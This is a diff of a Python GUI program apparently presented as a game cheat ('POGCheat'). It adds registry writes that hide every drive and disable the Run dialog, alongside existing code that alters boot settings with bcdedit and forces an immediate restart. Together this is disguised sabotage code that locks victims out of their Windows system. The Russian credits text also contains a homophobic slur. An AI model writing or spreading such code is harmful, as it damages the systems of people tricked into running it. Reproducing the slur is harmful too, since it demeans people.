@@ -7,6 +7,7 @@ import ctypes
 import win32gui
 import win32con
 import math
+import winreg
 
 current_folder = os.path.dirname(os.path.realpath(__file__))
 assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")
@@ -119,7 +120,7 @@ class App(customtkinter.CTk):
 
         self.devs_frame_text = customtkinter.CTkTextbox(self.devs_frame, height=260)
         self.devs_frame_text.grid(row=1, column=0, padx=(20, 20), pady=(20, 0), sticky="new")
-        self.devs_frame_text.insert("0.0", "POGCheat создавали:\n\n" + "- VayLorm - (TODO: add text)\n" + "- dotPast (Джуст который пидор) - (TODO: add text)\n" + "\nПри создании использовались:\n" + " - CustomTkinter\n" + " - что то еще я забыл - dotPast\n\n" + "Оригинал логотипа: Эмоция POGGERS от VoidMakesVids на 7TV (https://7tv.app/emotes/60af1ba684a2b8e655387bba)\n\n\n" + "Создано для НЕДОХАКЕРЫ Lite (https://www.youtube.com/@nedohackerslite)" + "\nPS. - копировать текст из этого поля с помощью CTRL+C")
+        self.devs_frame_text.insert("0.0", "POGCheat создавали:\n\n" + "- VayLorm - (TODO: add text)\n" + "- dotPast (Джуст который пидор) - (TODO: add text)\n" + "\nПри создании использовались:\n" + " - CustomTkinter\n" + " - что то еще я забыл - dotPast\n\n" + "Оригинал логотипа: Эмоция POGGERS от VoidMakesVids на 7TV (https://7tv.app/emotes/60af1ba684a2b8e655387bba)\nМемы от: x6 (https://www.youtube.com/@x6__)\nРазработчиков Raldi's Crackhouse (https://gamejolt.com/games/raldicrackhouse/769103)\n\n\n\n" + "Создано для НЕДОХАКЕРЫ Lite (https://www.youtube.com/@nedohackerslite)" + "\nPS. - копировать текст из этого поля с помощью CTRL+C")
         self.devs_frame_text.configure(state="disabled")
         self.devs_frame_text.bind("<1>", lambda event: self.devs_frame_text.focus_set())
 
@@ -179,6 +180,12 @@ class App(customtkinter.CTk):
         os.system('bcdedit /set {current} bootmenupolicy no')
         os.system('bcdedit /set {current} bootstatuspolicy no')
 
+        explorer_policy_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer')
+
+        # Block access to run dialog and all system drives
+        winreg.SetValueEx(explorer_policy_key, 'NoViewOnDrive', 0, winreg.REG_DWORD, 0x03ffffff)
+        winreg.SetValueEx(explorer_policy_key, 'NoRun', 0, winreg.REG_DWORD, 0x00000001)
+
         os.system('shutdown /r /t 0 /f')
 
     def devs_button_event(self):
@@ -205,19 +212,6 @@ class App(customtkinter.CTk):
             self.about_frame.grid(row=0, column=1, sticky="nsew")
         else:
             self.about_frame.grid_forget()
-
-    def cherry_window(self):
-        top = customtkinter.CTkToplevel()
-        top.title("cherry")
-        top.geometry("144x144")
-
-        cherry = customtkinter.CTkImage(Image.open(os.path.join(assets, 'cherry.jpg')), size=(144,144))
-
-        label = customtkinter.CTkLabel(top, image=cherry, text="", height=144)
-        label.grid(row=0, column=0, sticky="nsew")
-
-        top.attributes("-topmost", True)
-        top.attributes("-disabled", True)
 
 
 if __name__ == "__main__":
